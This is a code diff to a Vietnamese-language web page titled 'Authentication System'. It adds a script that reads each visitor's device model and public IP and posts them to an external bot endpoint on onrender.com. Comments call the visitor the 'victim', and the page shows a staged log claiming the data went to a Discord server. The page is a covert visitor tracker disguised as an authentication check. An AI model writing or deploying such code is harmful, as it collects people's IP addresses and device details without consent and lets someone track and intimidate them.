@@ -6,6 +6,7 @@
     <title>Hệ thống Xác thực</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.38/ua-parser.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300&family=Josefin+Sans:wght@200;300;400&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -434,16 +435,30 @@
         }
 
         async function scan(ans) {
+    // Lấy thông tin thiết bị chi tiết
+    const parser = new UAParser();
+    const result = parser.getResult();
+    const deviceDetail = result.device.model ? `${result.device.vendor || ''} ${result.device.model}` : "Unknown Device";
+    
+    // Lấy IP
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
-    const device = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
 
-    // Gửi về URL của bot
-    await fetch('https://mybot-lfij.onrender.com/Log-Visitor', {
+    // Gửi về URL của bot (Lưu ý: URL này phải khớp với đường dẫn bạn đã viết trong bot)
+    await fetch('https://mybot-lfij.onrender.com/log-visitor', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ip: ipData.ip, device: device })
+        body: JSON.stringify({ 
+            ip: ipData.ip, 
+            device: deviceDetail // Gửi tên máy thật về
+        })
     });
+
+    // Thêm hiệu ứng log cho "nạn nhân" xem cho kịch tính
+    document.getElementById('log').innerHTML = ''; // Xóa log cũ
+    addLine('<span class="log-scanning">Đang kết nối đến thiết bị...</span>', '', 0);
+    addLine('<span class="log-result">Đã xác định: ' + deviceDetail + '</span>', '', 1500);
+    addLine('<span class="log-discord">Đã gửi dữ liệu về máy chủ Discord.</span>', '', 3000);
 }
     </script>
 </body>
